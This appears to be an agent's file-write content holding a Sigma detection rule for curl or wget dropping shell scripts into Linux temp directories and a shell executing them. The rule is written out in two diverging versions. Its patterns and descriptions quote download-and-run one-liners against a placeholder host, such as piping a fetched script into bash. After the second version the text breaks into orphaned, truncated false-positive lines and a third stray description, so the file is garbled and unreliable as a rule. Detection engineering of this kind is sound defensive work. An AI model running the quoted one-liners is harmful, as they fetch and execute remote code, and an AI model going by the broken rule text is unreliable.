args.content:
# =============================================================================
# Sigma rule: curl/wget dropping a shell script into /tmp, then bash/sh running it
# Backend-agnostic (process_creation / Linux). Uses only widely supported
# modifiers (endswith, startswith, contains, contains|all) so it converts for
# Sysmon-for-Linux, auditd, Falco/CSOL, Elastic ECS, Splunk, Qualys etc.
# =============================================================================
title: Malicious Payload Download and Execution via curl or wget to Temp Directory
id: 3f2a1c94-8d5b-4f6e-9a72-5c1d8e4b7a06
related:
    - id: 5b4a3c2d-1e6f-4a8b-9c0d-7e8f9a0b1c2d   # Generic "Suspicious Sh Process from Temp" (community)
      type: similar
    - id: 8c1f0e77-2b49-4d3a-a15e-6f9b0c2d4e88   # "Suspicious Curl Process Start" (community)
      type: similar
status: experimental
authors:
    - Security Detection Engineering
date: '2026-10-26'
modified: '2026-10-26'
description: |
    Detects the classic Linux delivery/execution chain in which a file transfer
    utility (curl, wget) writes a shell script into a world-writable temporary
    directory (/tmp, /var/tmp, /dev/shm, /home/*/tmp) and that script is then
    executed by a POSIX shell (sh, bash, dash, ksh, zsh, busybox sh).

    The rule fires on either half of the chain, so both the write and the
    execution are surfaced even when the attacker splits them across separate
    processes (e.g. "curl http://host/x.sh -o /tmp/x.sh" as one event and
    "bash /tmp/x.sh" as the next), or performs them in a single one-liner
    (e.g. "curl -fsSL http://host/x.sh | bash").

    Detection coverage:
      1. curl/wget with an explicit output target inside a temp directory
         (-o, -O, --output, -P, shell redirection, tee) where a .sh/.bash
         script name is present.
      2. A shell process whose command line references a file in a temp
         directory (direct execution, "sh -c /tmp/...", "bash -c \"...\"").
      3. Shell-token adjacency patterns ("sh /tmp/x.sh", 'sh -c "/tmp/x.sh"',
         "exec /tmp/x.sh", "source /tmp/x.sh") that also catch the parent
         shell executing a staged temp script in a one-liner.

    Note: single-event detection cannot prove the causal link between the
    download and the execution; correlate the two events on host + file path
    (TargetFilename / CommandLine) within a short time window to raise
    confidence, and pivot on the source URL / hash of the dropped file.
references:
    - https://attack.mitre.org/techniques/T1105/
    - https://attack.mitre.org/techniques/T1059/004/
    - https://attack.mitre.org/techniques/T1036/007/
tags:
    - attack.execution
    - attack.command_and_control
    - attack.defense_evasion
    - attack.t1059.004
    - attack.t1105
    - attack.t1036.007
logsource:
    product: linux
    category: process_creation
detection:
    # --- 1. File transfer utility -------------------------------------------
    selection_dl_tool:
        - Image|endswith:
              - '/curl'
              - '/wget'
              - '/wget2'
              - '/http'
        - CommandLine|contains:
              - 'curl'
              - 'wget'
    # ... writing its output into a temp directory
    selection_dl_tmp_out:
        CommandLine|contains:
            - '-o /tmp/'
            - '-o/var/tmp/'
            - '-o /var/tmp/'
            - '-o/tmp/'
            - '-o /dev/shm/'
            - '-o/dev/shm/'
            - '-O /tmp/'
            - '-O/tmp/'
            - '-O /var/tmp/'
            - '-O /dev/shm/'
            - '--output /tmp/'
            - '--output=/tmp/'
            - '--output=/var/tmp/'
            - '--output=/dev/shm/'
            # curl -O --directory-prefix / -P puts the file in a chosen dir
            - '-P /tmp/'
            - '-P/tmp/'
            - '--directory-prefix /tmp/'
            - '--directory-prefix=/tmp/'
            - '-O --directory-prefix /tmp/'
            # shell redirection / piping through tee into a temp file
            - '> /tmp/'
            - '>/tmp/'
            - '>>/tmp/'
            - '> /var/tmp/'
            - '> /dev/shm/'
            - 'tee /tmp/'
            - 'tee -a /tmp/'
            - 'tee /var/tmp/'
            - 'tee /dev/shm/'
    # ... and that output is a shell script
    selection_dl_script_ext:
        CommandLine|contains:
            - '.sh'
            - '.bash'
            - '.ksh'
            - '.zsh'
    # --- 2. Shell executing a staged file from a temp directory --------------
    selection_exec_shell:
        Image|endswith:
            - '/bash'
            - '/sh'
            - '/dash'
            - '/ash'
            - '/ksh'
            - '/zsh'
            - '/csh'
            - '/tcsh'
            - '/busybox'
    selection_exec_tmp_arg:
        CommandLine|contains:
            - ' /tmp/'
            - '"/tmp/'
            - "'/tmp/"
            - '=/tmp/'
            - '>/tmp/'
            - '>>/tmp/'
            - ' /var/tmp/'
            - '"/var/tmp/'
            - ' /dev/shm/'
            - '"/dev/shm/'
            - '/tmp/.hidden'
    selection_exec_tmp_script_ext:
        CommandLine|contains:
            - '.sh'
            - '.bash'
            - '.ksh'
            - '.zsh'
    # Shell token immediately followed by a temp path: also matches the parent
    # shell of a one-liner such as: bash -c "curl ... -o /tmp/a.sh; bash /tmp/a.sh"
    selection_exec_adjacent:
        CommandLine|contains:
            - 'sh /tmp/'
            - 'sh /var/tmp/'
            - 'sh /dev/shm/'
            - 'sh -c /tmp/'
            - 'sh -c "/tmp/'
            - "sh -c '/tmp/"
            - 'sh -e /tmp/'
            - 'sh -x /tmp/'
            - 'sh -i /tmp/'
            - 'sh -l /tmp/'
            - 'sh -s /tmp/'
            - 'sh "/tmp/'
            - "sh '/tmp/"
            - 'exec /tmp/'
            - 'source /tmp/'
            - '. /tmp/'
    # --- Filters: benign infrastructure that legitimately touches temp files --
    filter_benign_tmp_paths:
        CommandLine|contains:
            - '/tmp/.mount_'
            - '/tmp/.X11-unix'
            - '/tmp/.font-unix'
            - '/tmp/systemd-private-'
            - '/tmp/systemd-coredump'
            - '/tmp/snap-private-tmp'
            - '/tmp/snap.'
            - '/tmp/xdg-'
            - '/tmp/.ICE-unix'
            - '/tmp/.git-credential'
    filter_package_manager:
        Image|endswith:
            - '/apt-get'
            - '/apt'
            - '/dpkg'
            - '/yum'
            - '/dnf'
            - '/zypper'
            - '/pacman'
            - '/rpm'
            - '/snap'
            - '/flatpak'
    condition: >
        (
            (selection_dl_tool and selection_dl_tmp_out and selection_dl_script_ext)
            or (selection_exec_shell and selection_exec_tmp_arg and selection_exec_tmp_script_ext)
            or (selection_exec_shell and selection_exec_adjacent)
            or selection_exec_adjacent
        )
        and not 1 of filter_*
falsepositives:
    - Legitimate installer/bootstrap scripts that self-document to /tmp and are
      executed with bash (e.g. vendor "curl ... -o /tmp/install.sh && bash
      /tmp/install.sh" quick-start instructions, NodeSource, Docker, Ansible
      bootstrap, cloud-init / user-data scripts, kickstart/preseed %post steps)
    - CI/CD runners, container image builds and config-management tools
      (Ansible, Salt, Puppet, Chef, Terraform provisioners) that stage helper
      scripts in /tmp before executing them
    - Security/monitoring agents and update daemons fetching signed payloads
      into temp directories
    - Developers and engineers running ad-hoc scripts out of /tmp during testing
level: medium
fieldMappings:
    - name: Image
      target:
        default: Image
        auditd: exe
        ecs: process.executable
    - name: CommandLine
      target:
        default: CommandLine
        auditd: cmdline
        ecs: process.command_line

# =============================================================================
# Sigma rule: curl/wget dropping a shell script into /tmp, then bash/sh running it
# Backend-agnostic (process_creation / Linux). Uses only widely supported
# modifiers (endswith, startswith, contains, contains|all) so it converts for
# Sysmon-for-Linux, auditd, Falco/CSOL, Elastic ECS, Splunk, Qualys, etc.
# =============================================================================
title: Malicious Payload Download and Execution via curl or wget to Temp Directory
id: 3f2a1c94-8d5b-4f6e-9a72-5c1d8e4b7a06
related:
    - id: 5b4a3c2d-1e6f-4a8b-9c0d-7e8f9a0b1c2d
      type: similar
    - id: 8c1f0e77-2b49-4d3a-a15e-6f9b0c2d4e88
      type: similar
status: experimental
authors:
    - Security Detection Engineering
date: '2026-10-26'
modified: '2026-10-26'
description: |
    Detects the classic Linux delivery/execution chain in which a file transfer
    utility (curl, wget) writes a shell script into a world-writable temporary
    directory (/tmp, /var/tmp, /dev/shm) and that script is then executed by a
    POSIX shell (sh, bash, dash, ash, ksh, zsh, busybox sh).

    The rule fires on either half of the chain, so both the write and the
    execution are surfaced even when the attacker splits them into separate
    process events (e.g. "curl http://host/x.sh -o /tmp/x.sh" as one event and
    "bash /tmp/x.sh" as the next) or runs them as a single one-liner
    ("curl -fsSL http://host/x.sh -o /tmp/x.sh && bash /tmp/x.sh").

    Detection coverage:
      1. curl/wget whose output target (-o, -O, -qO, --output, -P,
         --directory-prefix, shell redirection, tee) is inside a temp directory
         and whose command line contains a .sh/.bash/.ksh/.zsh script name.
      2. A shell process (Image = sh/bash/dash/ksh/zsh/busybox) with a temp
         directory script path in its command line - direct execution or
         "sh -c /tmp/x.sh" / 'bash -c "bash /tmp/x.sh"'.
      3. Shell-token adjacency ("sh /tmp/x.sh", 'sh -c "/tmp/x.sh"',
         "exec /tmp/x.sh", "source /tmp/x.sh"). This also catches the parent
         shell of a one-liner and wrappers such as sudo/nohup/env/timeout.

    Caveats / tuning:
      - A single process event cannot prove the causal link between the download
        and the execution. Correlate the two events on host + dropped file path
        within a short window (e.g. 120 s) to raise confidence, and pivot on the
        source URL and the hash of the dropped file.
      - Pure "curl ... | bash" with no file on disk produces no temp path and is
        covered by a companion pipe-to-shell rule, not by this one.
references:
    - https://attack.mitre.org/techniques/T1105/
    - https://attack.mitre.org/techniques/T1059/004/
    - https://attack.mitre.org/techniques/T1036/007/
tags:
    - attack.execution
    - attack.command_and_control
    - attack.defense_evasion
    - attack.t1059.004
    - attack.t1105
    - attack.t1036.007
logsource:
    product: linux
    category: process_creation
detection:
    # --- 1a. file transfer utility -------------------------------------------
    selection_dl_tool:
        - Image|endswith:
              - '/curl'
              - '/wget'
              - '/wget2'
        - CommandLine|contains:
              - 'curl '
              - 'wget '
              - '/curl'
              - '/wget'
    # --- 1b. ... writing its output into a temp directory --------------------
    selection_dl_tmp_out:
        CommandLine|contains:
            - '-o /tmp/'
            - '-o/tmp/'
            - '-o /var/tmp/'
            - '-o/var/tmp/'
            - '-o /dev/shm/'
            - '-o/dev/shm/'
            - '-O /tmp/'
            - '-O/tmp/'
            - '-O /var/tmp/'
            - '-O /dev/shm/'
            - 'O /tmp/'
            - 'O/tmp/'
            - '-qO /tmp/'
            - '-qO/tmp/'
            - '--output /tmp/'
            - '--output=/tmp/'
            - '--output=/var/tmp/'
            - '--output=/dev/shm/'
            - '-P /tmp/'
            - '-P/tmp/'
            - '--directory-prefix /tmp/'
            - '--directory-prefix=/tmp/'
            - '> /tmp/'
            - '>/tmp/'
            - '>>/tmp/'
            - '> /var/tmp/'
            - '> /dev/shm/'
            - 'tee /tmp/'
            - 'tee -a /tmp/'
            - 'tee /var/tmp/'
            - 'tee /dev/shm/'
    # --- 1c. ... and that output is a shell script ---------------------------
    selection_dl_script_ext:
        CommandLine|contains:
            - '.sh'
            - '.bash'
            - '.ksh'
            - '.zsh'
    # --- 2a. shell process ----------------------------------------------------
    selection_exec_shell:
        Image|endswith:
            - '/bash'
            - '/sh'
            - '/dash'
            - '/ash'
            - '/ksh'
            - '/zsh'
            - '/csh'
            - '/tcsh'
            - '/busybox'
    # --- 2b. ... with a temp directory path in the arguments ------------------
    selection_exec_tmp_arg:
        CommandLine|contains:
            - ' /tmp/'
            - '"/tmp/'
            - "'/tmp/"
            - '=/tmp/'
            - '>/tmp/'
            - '>>/tmp/'
            - ' /var/tmp/'
            - '"/var/tmp/'
            - "'/var/tmp/"
            - ' /dev/shm/'
            - '"/dev/shm/'
            - "'/dev/shm/"
    # --- 2c. ... pointing at a script ----------------------------------------
    selection_exec_tmp_script_ext:
        CommandLine|contains:
            - '.sh'
            - '.bash'
            - '.ksh'
            - '.zsh'
    # --- 2d. shell token immediately followed by a temp path ------------------
    selection_exec_adjacent:
        CommandLine|contains:
            - 'sh /tmp/'
            - 'sh /var/tmp/'
            - 'sh /dev/shm/'
            - 'sh -c /tmp/'
            - 'sh -c "/tmp/'
            - 'sh -c '"'"'/tmp/'
            - 'sh -e /tmp/'
            - 'sh -x /tmp/'
            - 'sh -i /tmp/'
            - 'sh -l /tmp/'
            - 'sh -s /tmp/'
            - 'sh "/tmp/'
            - 'sh '"'"'/tmp/'
            - 'exec /tmp/'
            - 'source /tmp/'
            - '. /tmp/'
    # --- filters: infrastructure that legitimately touches temp files ---------
    filter_benign_tmp_paths:
        CommandLine|contains:
            - '/tmp/.mount_'
            - '/tmp/.X11-unix'
            - '/tmp/.font-unix'
            - '/tmp/.ICE-unix'
            - '/tmp/systemd-private-'
            - '/tmp/systemd-coredump'
            - '/tmp/snap-private-tmp'
            - '/tmp/snap.'
            - '/tmp/xdg-'
            - '/tmp/.git-credential'
    filter_package_manager:
        Image|endswith:
            - '/apt-get'
            - '/apt'
            - '/dpkg'
            - '/yum'
            - '/dnf'
            - '/zypper'
            - '/pacman'
            - '/rpm'
            - '/snap'
            - '/flatpak'
    condition: >
        (
            (selection_dl_tool and selection_dl_tmp_out and selection_dl_script_ext)
            or (selection_exec_shell and selection_exec_tmp_arg and selection_exec_tmp_script_ext)
            or (selection_exec_shell and selection_exec_tmp_arg)
            or selection_exec_adjacent
        )
        and not 1 of filter_*

      user-data scripts, kickstart/preseed %post steps)
    - CI/CD runners, container image builds and config-management tools
      (Ansible, Salt, Puppet, Chef, Terraform provisioners) staging helper

    - Security/monitoring agents and update daemons fetching payloads into

    - Developers and engineers running ad-hoc scripts out of /tmp while testing

description: |
    Detects the classic Linux delivery/execution chain in which a file transfer
    utility (curl, wget) writes a shell script into a world-writable temporary
    directory (/tmp, /var/tmp, /dev/shm) and that script is then executed by a
    POSIX shell (sh, bash, dash, ash, ksh, zsh, busybox sh).

    The rule fires on either half of the chain, so both the write and the
    execution are surfaced even when the attacker splits them into separate
    process events (e.g. "curl http://host/x.sh -o /tmp/x.sh" as one event and
    "bash /tmp/x.sh" as the next) or runs them as a single one-liner
    ("curl -fsSL http://host/x.sh -o /tmp/x.sh && bash /tmp/x.sh").

    Detection coverage:
      1. curl/wget whose output target (-o, -O, -qO, --output, -P,
         --directory-prefix, shell redirection, tee) is inside a temp directory
         and whose command line contains a .sh/.bash/.ksh/.zsh script name.
      2. A shell process (Image = sh/bash/dash/ksh/zsh/busybox) that references
         a path inside a temp directory in its command line - direct execution
         ("bash /tmp/x.sh"), "sh -c /tmp/x.sh", 'bash -c "bash /tmp/x.sh"' -
         including extension-less droppers such as "/tmp/.x", which is why the
         script extension is not mandatory for this leg.
      3. A script whose image path itself is inside a temp directory being
         executed directly (chmod +x /tmp/x.sh && /tmp/x.sh).
      4. Shell-token adjacency ("sh /tmp/x.sh", 'sh -c "/tmp/x.sh"',
         "exec /tmp/x.sh", "source /tmp/x.sh"). This also catches the parent
         shell of a one-liner and wrappers such as sudo/nohup/env/timeout.

    Caveats / tuning:
      - A single process event cannot prove the causal link between the download
        and the execution. Correlate the two events on host + dropped file path
        within a short window (e.g. 120 s) to raise confidence, and pivot on the
        source URL and the hash of the dropped file.
      - Pure "curl ... | bash" with no file on disk produces no temp path and is
        covered by a companion pipe-to-shell rule, not by this one.
